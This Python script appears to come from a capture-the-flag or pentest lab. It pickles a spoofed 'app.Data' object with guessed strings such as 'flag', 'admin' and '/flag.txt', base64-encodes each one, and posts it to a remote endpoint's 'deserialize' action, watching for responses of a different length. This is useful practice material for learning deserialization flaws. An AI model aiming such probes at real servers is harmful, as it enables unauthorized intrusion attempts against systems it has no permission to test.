import pickle
import base64
import sys
import types
import requests

TARGET = "http://cc1.pentestgarage.com:3790/"

# create fake module
app = types.ModuleType("app")
sys.modules["app"] = app

class Data:
    __module__ = "app"

    def __init__(self, text):
        self.text = text

app.Data = Data


def generate_payload(value):
    payload = Data(value)
    encoded = base64.b64encode(pickle.dumps(payload))
    return encoded.decode()


# possible values to test
tests = [
    "flag",
    "FLAG",
    "Flag",
    "admin",
    "administrator",
    "root",
    "superuser",
    "owner",
    "staff",
    "moderator",
    "secret",
    "secrets",
    "key",
    "token",
    "apikey",
    "password",
    "passwd",
    "auth",
    "getflag",
    "showflag",
    "printflag",
    "readflag",
    "giveflag",
    "debug",
    "dev",
    "test",
    "internal",
    "system",
    "config",
    "settings",
    "true",
    "True",
    "false",
    "False",
    "yes",
    "on",
    "enable",
    "enabled",
    "1",
    "0",
    "flag.txt",
    "/flag",
    "/flag.txt",
    "/app/flag",
    "/home/flag",
    "/tmp/flag"
]

baseline = None

for t in tests:
    payload = generate_payload(t)

    response = requests.post(
        TARGET,
        data={
            "data": payload,
            "action": "deserialize"
        }
    )

    length = len(response.text)
    status = response.status_code

    if baseline is None:
        baseline = length

    marker = ""
    if length != baseline:
        marker = "<<< DIFFERENT RESPONSE"

    print(f"{t:15} | Status: {status} | Length: {length} {marker}")